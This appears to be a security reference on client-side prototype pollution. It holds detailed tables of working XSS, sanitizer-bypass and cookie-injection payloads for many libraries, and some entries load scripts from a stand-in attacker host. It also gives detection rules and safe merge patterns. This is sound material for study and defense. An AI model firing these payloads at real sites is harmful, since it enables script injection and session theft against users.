---
name: client-side-prototype-pollution
description: Client-Side Prototype Pollution (CSPP) — pollution sources (URL query, hash, JSON, postMessage), browser-resident pollution sinks (URL/hash parsers, jQuery `$.extend`, hand-rolled merges), and the script-gadget catalog (BlackFan, sanitizer bypasses, browser-API gadgets) that escalates pollution to DOM XSS / open redirect / cookie injection in the user's browser
---

# Client-Side Prototype Pollution (CSPP)

**CWE coverage**: CWE-1321 (primary, *Improperly Controlled Modification of Object Prototype Attributes*) plus the downstream CWEs the gadget actually lands. CodeQL maps the same query family (`js/prototype-polluting-assignment`, `js/prototype-polluting-merge-call`, `js/prototype-pollution-utility`) to **CWE-79** (DOM XSS), **CWE-94** (code injection), **CWE-400** (resource exhaustion), **CWE-471** (modification of assumed-immutable data); HackTricks-class browser-API gadgets land **CWE-601** (open redirect) and cookie-injection variants. Choose the downstream CWE that matches the gadget reached.

Client-Side Prototype Pollution lets an attacker inject a property into `Object.prototype` (or `Array.prototype`, `String.prototype`, etc.) **inside the victim's browser**. Like SSPP, the pollution itself is rarely the impact — it is an *amplifier* that becomes DOM XSS, sanitizer bypass, open redirect, or arbitrary script load only when combined with a downstream **gadget**: existing client-side code (in the page bundle, a third-party tag, or even a built-in browser API) that reads an undefined property and uses it as a security-sensitive parameter (`innerHTML`, `src`, `href`, `srcdoc`, `onerror`, `template`, `whiteList`, `ALLOWED_ATTR`, `sourceURL`, etc.).

A vulnerable page therefore needs two things to be exploitable:

1. **A pollution source/sink in the browser** — a place where attacker-controlled keys flow into a write of the form `target[__proto__][key] = value`, `target.constructor.prototype[key] = value`, or `target.prototype[key] = value`. In the browser this is most commonly:
   - A library that parses `location.search` / `location.hash` into a nested object using `__proto__` / `constructor[prototype]` bracket notation (the BlackFan PP catalog: `jquery-deparam`, `jquery-bbq`, `MooTools More`, `purl`, `arg.js`, `Aurelia path`, `analytics-utils`, `CanJS deparam`, etc.).
   - `$.extend(true, target, attackerJSON)` (jQuery deep merge), `_.merge` / `_.set` shipped in the page bundle, hand-rolled `for…in` recursive copy, hand-rolled hash parsers (`split('&').reduce((a,kv) => …)`).
   - `JSON.parse` of attacker JSON followed by a deep-merge into a real object (postMessage / WebSocket payloads, `localStorage` consumers).
2. **A script gadget** — code in the same realm that reads an undefined property from an inherited prototype after pollution. This is either an **app-bundle gadget**, a **library gadget** (the BlackFan script-gadget catalog: jQuery `$.get`/`$(html)`/`$(x).attr`/`$(x).on`, Bootstrap-style merges, `recaptcha`, `Twitter UWT`, `Tealium`, `Akamai Boomerang`, `lodash` template, `sanitize-html`/`DOMPurify`/`js-xss`/`Closure` sanitizer-config gadgets, `Marionette.js`, `Adobe DTM`, `Knockout.js`, `Zepto.js`, `Sprint.js`, `Vue.js`, `Popper.js`, `Pendo Agent`, `script.aculo.us`, `hCaptcha`, `Google Tag Manager`, `Google Analytics`, etc.), or — since 2023 — a **built-in browser-API gadget** (`URL` reading `href`, `Notification` reading `title`, `Worker` reading `name`, `Image` reading `src`, `URLSearchParams` reading `toString`).

> **Primary references**
> - BlackFan / Sergey Bobrov — *Client-Side Prototype Pollution and useful Script Gadgets* (`https://github.com/BlackFan/client-side-prototype-pollution`) — the canonical catalog of PP-vulnerable URL parsers and 50+ script gadgets across jQuery, analytics tags, sanitizers, template engines.
> - PortSwigger Web Security Academy — *Client-side prototype pollution vulnerabilities* (`https://portswigger.net/web-security/prototype-pollution/client-side`) — sources, sinks, gadgets, constructor-based pollution as a `__proto__` filter bypass, double-sanitization bypass.
> - PortSwigger Research — *Widespread Prototype Pollution Gadgets* — 11 browser-API gadgets that work against any page once the prototype is polluted.
> - HackTricks — *Client Side Prototype Pollution* (`https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html`) — modern tooling (DOM Invader, ppfuzz 2.0, ppmap, proto-find, PPScan, protoStalker), debug snippet `Object.defineProperty(Object.prototype, "x", { get() { console.trace(); return "test" } })`, recent CVEs.
> - Michał Bentkowski (Securitum) — *Prototype pollution and bypassing client-side HTML sanitizers* (`https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/`) — the original sanitize-html / DOMPurify / Closure / js-xss bypass payloads.
> - Olivier Arteau — *JavaScript prototype pollution attack in NodeJS* (NorthSec 2018) — the foundational paper still cited by the BlackFan README.
> - Kirill89 — *prototype-pollution-explained* (`https://github.com/Kirill89/prototype-pollution-explained`) — minimal lab-style demo, lodash `_.merge` CVE-2018-16487.
> - Acunetix — *Client-Side Prototype Pollution* vulnerability profile (`https://www.acunetix.com/vulnerabilities/web/client-side-prototype-pollution/`) — concise remediation guidance.
> - Dodir.sec — *JavaScript Prototype Pollution Attack: A Simplified Guide* (`https://medium.com/@dodir.sec/javascript-prototype-pollution-attack-a-simplified-guide-c3b4ba8a6441`).
> - GitHub CodeQL — `js/prototype-polluting-assignment`, `js/prototype-polluting-merge-call`, `js/prototype-pollution-utility` (`https://codeql.github.com/codeql-query-help/javascript/`); the upstream `PrototypePollutionUtility.ql` source defines the named guard predicates this reference uses (`HasOwnPropertyGuard`, `BlacklistEqualityGuard`, `WhitelistEqualityGuard`, `InExprGuard`, `InstanceOfGuard`, `TypeofGuard`, `IsPlainObjectGuard`, `BlacklistInclusionGuard`, `WhitelistInclusionGuard`, `ObjectCreateNullCall`).

For the **server-side variant** (Node.js / Deno / NPM-package gadgets, RCE/SSRF chains, `execArgv`, `lodash.template`, `bson`, `child_process`), see `references/server_side_prototype_pollution.md` — sources, sinks, and the conceptual flow are the same; only the gadget surface differs.

---

## Where to Look

**Pollution sources (browser-resident)**
- `location.search` query string parsed into a nested object (`?__proto__[gadget]=value`, `?__proto__.gadget=value`, `?constructor[prototype][gadget]=value`).
- `location.hash` URL fragment (`#__proto__[gadget]=value`); never sent to the server, executes purely in-browser.
- `JSON.parse` of attacker JSON from the URL, `localStorage`/`sessionStorage`, IndexedDB, postMessage, WebSocket, EventSource/SSE, fetched JSON responses where the attacker controls a reflected/cached field.
- `postMessage` event handlers that merge `event.data` into a config object.
- WebSocket / SSE / shared-worker messages merged into a state store.
- File uploads parsed into FormData with attacker-controlled field names.
- Cookies decoded as JSON then merged.

**Pollution sinks (browser-resident merges/parsers)**
- BlackFan-cataloged URL/hash parsers that walk `__proto__` / `constructor[prototype]`:
  - `jquery-query-object` (CVE-2021-20083), `jquery-sparkle` (CVE-2021-20084), `backbone-query-parameters` (CVE-2021-20085), `jquery-bbq` (CVE-2021-20086), `jquery-deparam` (CVE-2021-20087), `MooTools More` (CVE-2021-20088), `purl` / jQuery-URL-Parser (CVE-2021-20089).
  - `V4Fire Core`, `CanJS deparam`, `HubSpot Tracking Code`, `YUI 3 querystring-parse`, `Mutiny`, `jQuery parseParams`, `php.js parse_str`, `arg.js`, `davis.js`, `Component querystring`, `Aurelia path`, `analytics-utils < 1.0.3`, `Wistia Embedded Video`, `Swiftype Site Search`.
- Generic browser-side merge / extend / set: `$.extend(true, target, src)` (jQuery deep merge — CVE-2023-26136 / CVE-2023-26140 in 3.6.0–3.6.3), `_.merge`, `_.mergeWith`, `_.defaultsDeep`, `_.set`, `_.setWith`, `_.zipObjectDeep` shipped in the page bundle, `deepmerge`, `merge-deep`, `extend`, `just-extend`, hand-rolled recursive `for…in` merges.
- Hand-rolled hash parsers: `location.hash.slice(1).split('&').reduce(...)` patterns that walk attacker keys.
- Functions matching CodeQL's `js/prototype-pollution-utility` shape — recursive copy where the destination base, key, AND right-hand side all derive from an enumerated property name.

**Script gadgets (where polluted defaults turn into XSS)**
- App code: any `if (config.<flag>) ...` / `el.innerHTML = config.<x>` / `new Image().src = config.<src>` reading a config-style object.
- Library gadgets: see the BlackFan script-gadget table below.
- Browser-API gadgets (any page, any origin, since 2023): see Browser-API Gadgets below.
- HTML sanitizers configured via attacker-pollutable option keys: `sanitize-html`, `DOMPurify`, `js-xss`, `Closure HtmlSanitizer`.

---

## Core Mechanic

```javascript
// 1) attacker delivers a payload via a URL the victim opens:
//    https://victim.example/?__proto__[innerHTML]=<img/src/onerror=alert(1)>

// 2) a URL-parsing library on the page (e.g., jquery-deparam) walks
//    bracket notation including __proto__ keys, ending in a write like:
target['__proto__']['innerHTML'] = '<img/src/onerror=alert(1)>';

// 3) Object.prototype.innerHTML is now the malicious string. Every
//    {} / new Object() in the realm sees it via prototype-chain lookup.
({}).innerHTML // → "<img/src/onerror=alert(1)>"

// 4) any later code that reads an undefined `innerHTML` from a config-style
//    object — even built-in browser APIs — picks up the polluted default
//    and renders it as HTML. With the right gadget, this is reliable XSS.
```

Two things to remember about CSPP that differ from server-side:

- **Hash payloads do not hit the server.** `#__proto__[gadget]=…` is browser-only — no WAF/server-side filter ever sees it. Some PP libraries are only exploitable via the hash (`Swiftype Site Search`, `jquery-query-object` hash branch, Purl).
- **Browser path normalization does NOT apply** to query strings or fragments. `?__proto__[x]=y` and `#__proto__[x]=y` reach the JS exactly as written; encoding tricks are needed only to bypass app-side filters, not the browser.

---

## Source -> Sink -> Gadget Pattern

**Sources** (decoded by the URL/hash/JSON parser — DANGEROUS when the parser walks `__proto__` keys)

| Source | Vehicle | Notes |
|--------|---------|-------|
| `location.search` | Reflected URL share, `?__proto__[x]=y` | `?__proto__.x=y` (dot notation) and `?constructor[prototype][x]=y` (constructor-based) are alternate forms |
| `location.hash` | Browser-only, `#__proto__[x]=y` | Never reaches server; bypasses every server-side filter and most CDN-level WAFs |
| `JSON.parse` of attacker JSON | postMessage / WS / fetched API / storage | `__proto__` becomes own property of parsed object — only escalates if a downstream `_.merge`/recursive copy walks it onto the prototype |
| `postMessage` | Cross-window child/parent | Common when iframes accept config from parent without origin check |
| `localStorage` / `sessionStorage` | Cached attacker payload from earlier session | Stored CSPP — fires on every reload until storage is cleared |
| WebSocket / SSE | Live attacker channel | Tenant-isolated apps may be polluted by a single message |
| Cookies | JSON-encoded cookie merged into config | Set by a separate vulnerability (CRLF, sub-domain takeover) |

**Sinks** (the parser/merge call that does the prototype write)

```javascript
// VULN — jQuery deep extend
$.extend(true, target, JSON.parse(payload));         // CVE-2023-26136 / -26140 in 3.6.0–3.6.3

// VULN — lodash merge in the browser bundle
_.merge(target, payload);                            // CVE-2018-16487 in lodash < 4.17.11
_.set(obj, userPath, userVal);                       // path may be "__proto__.x"

// VULN — hand-rolled hash parser (extremely common in legacy bundles)
location.hash.slice(1).split('&').forEach(kv => {
  const [k, v] = kv.split('=');
  const keys = decodeURIComponent(k).split('.');
  let o = config;
  for (let i = 0; i < keys.length - 1; i++) o = o[keys[i]] ||= {};
  o[keys.at(-1)] = decodeURIComponent(v || '');
});                                                  // VULN — walks __proto__/constructor

// VULN — recursive for…in merge (matches CodeQL js/prototype-pollution-utility)
function merge(dst, src) {
  for (const key in src) {                           // walks inherited keys
    if (typeof src[key] === 'object') merge(dst[key] = dst[key] || {}, src[key]);
    else dst[key] = src[key];
  }
}
merge(globalConfig, JSON.parse(event.data));         // VULN
```

**Gadgets** (where the polluted default becomes a security-sensitive read)

```javascript
// 1) App-bundle gadget — reads optional flag/template
if (config.theme) document.body.setAttribute('class', config.theme);    // gadget when theme polluted with class injection
el.innerHTML = config.welcome ?? '';                                    // → XSS when welcome polluted with <img onerror=…>

// 2) Library gadget (BlackFan catalog) — see tables below

// 3) Browser-API gadget (HackTricks 2023+) — works on every page after pollution
new URL('#');                                                           // reads polluted Object.prototype.href → javascript: navigation
```

---

## Vulnerable URL/Hash Parser Catalog (BlackFan PP table)

These libraries parse `location.search` and/or `location.hash` into a nested object that walks `__proto__` or `constructor[prototype]` keys. Inclusion means a bare visit to a crafted URL pollutes `Object.prototype` for the rest of the page session.

| Library | Trigger payload (representative) | CVE | Notes |
|---------|-----------------------------------|-----|-------|
| `Wistia Embedded Video` | `?__proto__[test]=test`, `?__proto__.test=test` | (fixed) | Bracket and dot notation |
| `jquery-query-object` | `?__proto__[test]=test`, `#__proto__[test]=test` | CVE-2021-20083 | Hash branch — bypasses server-side filtering |
| `jquery-sparkle` | `?__proto__.test=test`, `?constructor.prototype.test=test` | CVE-2021-20084 | Constructor-based bypass works |
| `V4Fire Core Library` | `?__proto__.test=test`, `?__proto__[test]=test`, `?__proto__[test]={"json":"value"}` | — | JSON-value variant |
| `backbone-query-parameters` | `?__proto__.test=test`, `?constructor.prototype.test=test`, `?__proto__.array=1\|2\|3` | CVE-2021-20085 | Array-flavored variant |
| `jquery-bbq` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | CVE-2021-20086 | |
| `jquery-deparam` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | CVE-2021-20087 | Widely embedded in legacy plugins |
| `MooTools More` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | CVE-2021-20088 | |
| `Swiftype Site Search` | `#__proto__[test]=test` | (fixed) | **Hash-only** — never reaches WAF |
| `CanJS deparam` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | — | |
| `Purl (jQuery-URL-Parser)` | `?__proto__[test]=test`, `?constructor[prototype][test]=test`, `#__proto__[test]=test` | CVE-2021-20089 | Both query + hash branches |
| `HubSpot Tracking Code` | `?__proto__[test]=test`, `?constructor[prototype][test]=test`, `#__proto__[test]=test` | (fixed) | Often bundled invisibly via marketing tag |
| `YUI 3 querystring-parse` | `?constructor[prototype][test]=test` | — | Constructor-only — `__proto__` filtered |
| `Mutiny` | `?__proto__.test=test` | (fixed) | |
| `jQuery parseParams` | `?__proto__.test=test`, `?constructor.prototype.test=test` | — | |
| `php.js parse_str` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | — | The PHP-emulation port |
| `arg.js` | `?__proto__[test]=test`, `?__proto__.test=test`, `?constructor[prototype][test]=test`, `#__proto__[test]=test` | — | Most permissive parser; all four notations work |
| `davis.js` | `?__proto__[test]=test` | — | |
| `Component querystring` | `?__proto__[NUMBER]=test`, `?__proto__[123]=test` | — | Polllutes `Array.prototype` indices |
| `Aurelia path` | `?__proto__[test]=test` | — | |
| `analytics-utils < 1.0.3` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | — | |

The full live catalog is maintained at `https://github.com/BlackFan/client-side-prototype-pollution` — recheck before triage as new entries land.

---

## Script Gadget Catalog (BlackFan gadgets table)

If pollution is confirmed, these are the existing in-the-wild gadgets that turn pollution into XSS, sanitizer bypass, cookie injection, or arbitrary script load. Many ship invisibly via marketing/analytics tags.

| Gadget | Pollution payload (representative) | Impact |
|--------|------------------------------------|--------|
| `Wistia Embedded Video` | `?__proto__[innerHTML]=<img/src/onerror=alert(1)>` | XSS |
| `jQuery $.get` (all versions) | `?__proto__[context]=<img/src/onerror=alert(1)>&__proto__[jquery]=x` | XSS |
| `jQuery $.get >= 3.0.0` | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script` *(also works with `Boolean.prototype` pollution variant)* | XSS |
| `jQuery $.getScript >= 3.4.0` | `?__proto__[src][]=data:,alert(1)//` | XSS |
| `jQuery $.getScript 3.0.0–3.3.1` | `?__proto__[url]=data:,alert(1)//` (Boolean.prototype variant) | XSS |
| `jQuery $(html)` | `?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror=alert(1)>` | XSS |
| `jQuery $(x).off` | `?__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror=alert(1)>` (String.prototype variant) | XSS |
| `jQuery $(x).attr` (>= 1.8.0) | `?__proto__[OnError]=alert(1)&__proto__[SRC]=fakeimagewontload.jpg` | XSS |
| `jQuery $(x).on / submit` (>= 1.9.0) | `?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror=alert(1)>&__proto__[focus]=x&__proto__[needsContext]=x` | XSS |
| `Google reCAPTCHA` | `?__proto__[srcdoc][]=<script>alert(1)</script>` | XSS |
| `Twitter Universal Website Tag` | `?__proto__[hif][]=javascript:alert(1)` | XSS *(fixed)* |
| `Tealium Universal Tag` | `?__proto__[attrs][src]=1&__proto__[src]=data:,alert(1)//` | XSS |
| `Akamai Boomerang` | `?__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js` | XSS |
| `Lodash <= 4.17.15` | `?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)` | XSS via template `sourceURL` |
| `sanitize-html` | `?__proto__[*][]=onload` | Sanitizer bypass → XSS |
| `sanitize-html` | `?__proto__[innerText]=<script>alert(1)</script>` | Sanitizer bypass → XSS |
| `js-xss` | `?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src` | Sanitizer bypass → XSS |
| `DOMPurify <= 2.0.12` | `?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src` | Sanitizer bypass → XSS |
| `DOMPurify <= 2.0.12` | `?__proto__[documentMode]=9` | Sanitizer bypass via legacy IE-mode quirks |
| `Google Closure HtmlSanitizer` | `?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1` | Sanitizer bypass → XSS |
| `Google Closure HtmlSanitizer` | `?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//` | XSS via base-path injection |
| `Google Closure (trustedTypes)` | `?__proto__[trustedTypes]=x&__proto__[emptyHTML]=<img/src/onerror=alert(1)>` | XSS — bypasses Trusted Types policy |
| `Marionette.js / Backbone.js` | `?__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)` | XSS |
| `Adobe Dynamic Tag Management` | `?__proto__[src]=data:,alert(1)//` *(or `?__proto__[SRC]=<img …>`)* | XSS |
| `Swiftype Site Search` | `?__proto__[xxx]=alert(1)` | XSS |
| `Embedly Cards` | `?__proto__[onload]=alert(1)` | XSS |
| `Segment Analytics.js` | `?__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror=alert(1)>` | XSS |
| `Knockout.js` (Array.prototype) | `?__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,` | XSS via template eval |
| `Zepto.js` | `?__proto__[onerror]=alert(1)` | XSS |
| `Zepto.js` | `?__proto__[html]=<img/src/onerror=alert(1)>` | XSS |
| `Sprint.js` | `?__proto__[div][intro]=<img src onerror=alert(1)>` | XSS |
| `Vue.js` (v2) | `?__proto__[v-if]=_c.constructor('alert(1)')()` | XSS |
| `Vue.js` (v2) | `?__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script` | XSS |
| `Vue.js` (v2) | `?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()` | XSS |
| `Vue.js` (v2) | `?__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>alert(1)</script>` | XSS |
| `Vue.js` (v2) | `?__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('alert(1)')(),"` | XSS |
| `Vue.js` (v2) | `?__proto__[template]=<script>alert(1)</script>` | XSS |
| `Demandbase Tag` | `?__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?` | XSS |
| `@analytics/google-tag-manager` | `?__proto__[customScriptSrc]=//attacker.tld/xss.js` | XSS via arbitrary script load |
| `i18next` (and < 19.8.5 / >= 19.8.5 variants) | `?__proto__[lng]=cimode&__proto__[appendNamespaceToCIMode]=x&__proto__[nsSeparator]=<img/src/onerror=alert(1)>` | Potential XSS |
| `Google Analytics` | `?__proto__[cookieName]=COOKIE%3DInjection%3B` | Cookie injection |
| `Popper.js` | `?__proto__[arrow][style]=color:red;transition:all 1s&__proto__[arrow][ontransitionend]=alert(1)` *(also `[reference]` and `[popper]` variants)* | XSS via CSS-transition handler |
| `Pendo Agent` | `?__proto__[dataHost]=attacker.tld/js.js%23` | XSS |
| `script.aculo.us` (String.constructor) | `?x=x&x[constructor][__parseStyleElement][innerHTML]=<img/src/onerror=alert(1)>` | XSS |
| `hCaptcha` | `?__proto__[assethost]=javascript:alert(1)//` | XSS *(fixed)* |
| `Google Tag Manager` | `?__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<script>alert(1)</script>` | XSS |
| `Google Tag Manager` / `Google Analytics` | `?__proto__[q][0][0]=require&__proto__[q][0][1]=x&__proto__[q][0][2]=https://www.google-analytics.com/gtm/js?id=GTM-WXTDWH7` | XSS via arbitrary GTM container load |

The presence of any of these libraries in a page's bundle is a high-confidence escalation path from any pollution source on the same origin — gadgets compose across libraries: pollution from a hash-only parser like `Swiftype` can reach a sanitizer-bypass gadget in `DOMPurify` if both load on the same page.

---

## Browser-API Gadgets (PortSwigger Research, 2023–2025)

PortSwigger Research and HackTricks documented that **built-in browser APIs themselves are gadgets** once `Object.prototype` is polluted — this means even a page whose own bundle and third-party tags are clean is exploitable through standard `URL` / `Notification` / `Worker` / `Image` / `URLSearchParams` constructors. Confirmed working in evergreen browsers as of 2024-11.

| Gadget API | Polluted property read | Primitive |
|------------|------------------------|-----------|
| `new URL('#')` | `Object.prototype.href` | XSS via `javascript:` URL navigation when the URL is later assigned to `location` / used with `<a href>` |
| `new Notification('test')` | `title` | `alert()` payload via notification click |
| `new Worker(blob)` | `name` | JS execution inside the dedicated Worker |
| `new Image()` | `src` | Traditional `onerror` XSS — the polluted `src` is dereferenced when the image errors |
| `new URLSearchParams()` | `toString` | DOM-based open redirect via stringification in `location.assign(...)` paths |

A typical dynamic confirmation, harmless variant:

```html
<script>
  // For demo we pollute manually; in the wild the source is one of the parsers above.
  Object.prototype.href = 'javascript:alert(`polluted`)';
  new URL('#');     // → in Chrome: alert; in Firefox: navigates to javascript: URL
</script>
```

Because these gadgets live in the runtime itself, **every** application becomes exploitable as soon as a pollution source is reached — the sanitizer-bypass / library-gadget steps are no longer required. This is the strongest argument for `Object.freeze(Object.prototype)` early in the page lifecycle.

---

## HTML Sanitizer Bypass Patterns (Securitum / Bentkowski)

Sanitizer libraries take a **config object** (`ALLOWED_ATTR`, `whiteList`, `*` allow-rule) that is read with optional-chaining. Polluting the config keys via `Object.prototype` makes the sanitizer trust attacker-supplied attributes/elements. These payloads survive sanitization on the polluted page only.

```html
<!-- DOMPurify <= 2.0.12 — polluted ALLOWED_ATTR allows onerror+src -->
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
<!-- attacker then submits an HTML payload and DOMPurify lets it through -->
DOMPurify.sanitize('<img src=x onerror=alert(1)>')   // → unchanged in polluted page

<!-- DOMPurify <= 2.0.12 — IE-quirks-mode handling -->
?__proto__[documentMode]=9

<!-- sanitize-html — wildcard attr allow -->
?__proto__[*][]=onload
sanitizeHtml('<a onload=alert(1)>')                  // → unchanged in polluted page

<!-- sanitize-html — innerText sink revealed via polluted default -->
?__proto__[innerText]=<script>alert(1)</script>

<!-- js-xss — whiteList for img -->
?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src

<!-- Google Closure HtmlSanitizer — wildcard attribute key bypass -->
<script>
  Object.prototype['* ONERROR'] = 1;
  Object.prototype['* SRC'] = 1;
</script>
<!-- closure now keeps onerror and src on every element -->

<!-- Google Closure — polluted base path silently loads attacker JS -->
?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//

<!-- Google Closure — Trusted Types policy bypass via polluted emptyHTML -->
?__proto__[trustedTypes]=x&__proto__[emptyHTML]=<img/src/onerror=alert(1)>
```

The fix every sanitizer maintainer eventually shipped: replace internal allow/deny maps with `Object.create(null)`, use `Object.hasOwn()` / `Object.prototype.hasOwnProperty.call(map, key)` for membership checks, and freeze critical objects at module load. DOMPurify's CVE-2024-45801 patch did exactly this — see Recent CVEs below.

---

## Constructor-Based Pollution Bypass (PortSwigger Academy)

A common defensive pattern is to *strip property names equal to `__proto__`* from the user-controlled object before merging. This is **bypassable** because every JS object also exposes `constructor.prototype`, which is functionally equivalent to `__proto__`:

```javascript
let myObjectLiteral = {};
let myObject = new Object();

myObjectLiteral.constructor          // function Object(){...}
myObject.constructor.prototype       // Object.prototype  ← same target as __proto__
```

If the parser walks bracket notation, the following all reach `Object.prototype`:

```
?__proto__[gadget]=value             // classic
?__proto__.gadget=value              // dot-notation variant
?constructor[prototype][gadget]=value     // bypasses a strip-on-"__proto__" filter
?constructor.prototype.gadget=value       // dot-notation constructor variant
```

When a finding shows that `__proto__` is filtered, always test the `constructor[prototype]` variant before declaring SAFE.

---

## Double-Sanitization (Recursion-Less Strip) Bypass

A failed "strip-then-walk" defence is bypassable when the strip is non-recursive:

```
vulnerable.example/?__pro__proto__to__.gadget=payload
   strip "__proto__"  (single pass)  →
vulnerable.example/?__proto__.gadget=payload   ← now valid prototype-pollution source
```

Any time you see a string-replacement defense rather than an own-property guard, test the recursive-strip bypass alongside the constructor variant.

---

## Recent CVEs (Client-Side, 2023–2025)

| CVE / Reference | Component | Vulnerable Range | Chain |
|-----------------|-----------|------------------|-------|
| CVE-2024-45801 | DOMPurify | ≤ 3.0.8 | Pollution of `Node.prototype.after` *before* DOMPurify initialised bypasses the `SAFE_FOR_TEMPLATES` profile → stored XSS. Patched by `Object.hasOwn()` checks and `Object.create(null)` for internal maps |
| CVE-2023-26136 / CVE-2023-26140 | jQuery (`$.extend`) | 3.6.0 – 3.6.3 | `$.extend(true, target, attackerJSON)` introduces arbitrary properties into `Object.prototype` in the browsing context; attackerJSON sourced from `location.hash` / postMessage / fetched config |
| sanitize-html < 2.8.1 (2023-10) | sanitize-html | < 2.8.1 | Malicious attribute list `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` bypasses the allow-list |
| CVE-2018-16487 | lodash `_.merge` | < 4.17.11 | Foundational merge-sink CVE; still reachable when an old lodash ships in a browser bundle |
| CVE-2021-20083..20089 | jquery-query-object, jquery-sparkle, backbone-query-parameters, jquery-bbq, jquery-deparam, MooTools More, Purl | (per CVE) | URL/hash parser walks `__proto__`/`constructor[prototype]` (BlackFan catalog) |
| CVE-2019-7609 | Kibana | 6.6.0 | Server-side variant — included for completeness; see `references/server_side_prototype_pollution.md` |

---

## Detection Rules

### JS / TS Source Patterns (CodeQL-aligned)

CodeQL ships three sibling queries that overlap — running all three covers the broadest signal. Each is high-precision when paired with the safe patterns below.

| CodeQL query | What it catches |
|--------------|-----------------|
| `js/prototype-polluting-assignment` | Direct `obj[user]` / `obj[user][..]` assignments where `user` could be `__proto__` or `constructor` |
| `js/prototype-polluting-merge-call` | Calls to known-vulnerable merge/extend helpers (`lodash.merge`, `_.defaultsDeep`, `extend`, `just-extend`, `merge.recursive`, `jQuery.extend(true, …)`, `Hoek.merge`/`applyToDefaults`, `deepmerge` pre-4.2) |
| `js/prototype-pollution-utility` | Helpers inside the codebase that *themselves* perform polluting recursive copy / deep assignment — i.e. the application's own `merge` is the sink. The query enforces the structural shape: an enumerated property name simultaneously flows to the **base**, the **property** AND the **right-hand side** of a dynamic write. Hand-rolled merges this shape exactly almost always. |

The third query is the most useful in practice because it finds custom merges that no library list will catch.

### VULN — recursive `for…in` merge of attacker JSON / hash

```javascript
function deepCopy(dst, src) {
  for (const k in src) {                                  // walks inherited
    if (typeof src[k] === 'object' && src[k] !== null)
      deepCopy(dst[k] = dst[k] || {}, src[k]);
    else dst[k] = src[k];
  }
}
deepCopy(config, JSON.parse(location.hash.slice(1)));    // VULN — matches js/prototype-pollution-utility
```

### VULN — split-and-reduce hash parser

```javascript
function parseHash() {
  const out = {};
  location.hash.slice(1).split('&').forEach(kv => {
    const [k, v] = kv.split('=');
    const keys = decodeURIComponent(k).split(/[\.\[\]]+/).filter(Boolean);
    let o = out;
    for (let i = 0; i < keys.length - 1; i++) o = o[keys[i]] ||= {};
    o[keys.at(-1)] = decodeURIComponent(v || '');
  });
  return out;
}
Object.assign(globalConfig, parseHash());                // VULN — `keys` may include "__proto__"
```

### VULN — `$.extend(true, …)` of attacker JSON

```javascript
$.extend(true, settings, JSON.parse(payload));           // VULN — CVE-2023-26136 in jQuery 3.6.0–3.6.3
```

### VULN — `_.merge` / `_.set` in browser bundle

```javascript
_.merge(target, JSON.parse(event.data));                 // postMessage source
_.set(state, req.hash.path, req.hash.value);             // path may be "__proto__.x"
```

### VULN — known-vulnerable URL parser loaded on page

Static evidence the page imports / bundles any of:

```
jquery-query-object, jquery-sparkle, jquery-bbq, jquery-deparam, jquery-parseparam,
MooTools More, purl (jquery-url-parser), backbone-query-parameters, V4Fire Core,
CanJS deparam, HubSpot tracking code, YUI 3 querystring-parse, mutiny,
component/querystring, arg.js, davis.js, Aurelia path, php.js parse_str,
analytics-utils < 1.0.3, Wistia embed, Swiftype, Marionette.js,
HotJar/Adobe DTM/Demandbase/Embedly/Tealium/Boomerang/Pendo/Twitter UWT/recaptcha
(when loaded as a known-vulnerable inline gadget)
```

### SAFE — `Object.create(null)` everywhere a user key is stored

```javascript
const config = Object.create(null);                      // no prototype; pollution has no target
config[userKey] = userValue;
```

CodeQL's `PrototypePollutionUtility.ql` whitelists this: `class ObjectCreateNullCall extends CallNode` — a base reachable through `Object.create(null)` is excluded from results.

### SAFE — destination-side `hasOwnProperty` guard (CodeQL recommendation)

```javascript
function merge(dst, src) {
  for (const key in src) {
    if (!Object.hasOwn(src, key)) continue;
    if (Object.hasOwn(dst, key) && isObject(dst[key])) merge(dst[key], src[key]);
    else dst[key] = src[key];
  }
}
```

CodeQL's `HasOwnPropertyGuard` only treats this as a sanitizer when applied to the **destination** object, not the source — `__proto__`/`constructor` are own properties of attacker-crafted source objects but are NOT own properties of normal destination objects.

### SAFE — explicit blocklist (`__proto__`, `constructor`, `prototype`)

```javascript
function safeMerge(target, source) {
  for (const key in source) {
    if (!Object.hasOwn(source, key)) continue;
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    if (isObject(source[key])) safeMerge(target[key] ||= {}, source[key]);
    else target[key] = source[key];
  }
}
```

